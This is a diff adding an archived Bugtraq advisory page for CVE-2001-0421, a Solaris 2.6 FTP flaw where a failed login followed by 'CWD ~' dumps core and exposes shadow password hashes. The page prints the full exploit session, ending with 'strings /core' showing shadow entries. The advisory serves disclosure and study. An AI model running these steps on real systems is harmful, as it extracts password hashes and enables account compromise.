@@ -1,0 +1,102 @@
+#SpeeDr00t@Black Falcon<br>#bid2601<p><b><span style="font-size: 18pt;">Solaris FTP Core Dump Shadow Password Recovery Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2601/info">info</a><br><a href="http://www.securityfocus.com/bid/2601/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2601/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2601/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2601/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2601
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Configuration Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2001-0421<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 17 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 06:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was announced to Bugtraq by Warning3 &lt;warning3@mail.com&gt; on April 17, 2001.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris  2.6<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris  8_sparc<br/>
+					
+				
+					Sun Solaris  7.0<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	root@ /usr/sbin&amp;gt; telnet localhost 21<br/>Trying 127.0.0.1...<br/>Connected to localhost.<br/>Escape character is '^'.<br/>220 sun26 FTP server (SunOS 5.6) ready.<br/>user warning3<br/>331 Password required for warning3. &amp;lt;-- a valid username<br/>pass blahblah &amp;lt;--- a wrong password<br/>530 Login incorrect.<br/>CWD ~<br/>530 Please login with USER and PASS.<br/>Connection closed by foreign host.<br/>root@ /usr/sbin&amp;gt; ls -l /core<br/>-rw-r--r--   1 root     root      284304 Apr 16 10:20 /core<br/>root@ /usr/sbin&amp;gt; strings /core|more<br/>...snip...<br/>lp:NP:6445::::::<br/>P:64<br/>eH::::<br/>uucp:NP:6445:::
+	
+		<ul>
+</ul>
+</div>
